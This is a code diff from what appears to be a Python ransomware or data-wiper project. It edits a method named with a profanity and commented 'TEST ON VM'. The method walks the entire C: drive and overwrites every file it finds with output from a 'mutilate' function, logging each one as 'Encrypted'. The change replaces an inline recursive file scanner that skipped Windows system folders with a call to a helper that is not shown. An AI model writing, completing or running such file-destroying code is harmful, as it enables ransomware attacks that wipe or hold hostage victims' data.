@@ -148,23 +148,8 @@ Loop
   @staticmethod
   # TEST ON VM
   def file_fucker():
-
-    def scanrecurse(baseDir):
-      files = []
-      unsafe = ['C:/Windows','C:/Program Files','C:/Program Files (x86)']
-      for r, d, f in os.walk(baseDir):
-        for file in f:
-          filepath = os.path.join(r, file)
-        if os.path.exists(filepath):
-          files.append(os.path.join(r, file))
-          for item in unsafe:
-            if item in files:
-              files.remove(item)
-              
-          return files
-
     try:
-      for item in scanrecurse("C:"):
+      for item in functions.scanfolder("C:"):
         with open(item, 'w+') as File:
           File.write(crytographic_functions.mutilate(item))
           print("Encrypted:", item)
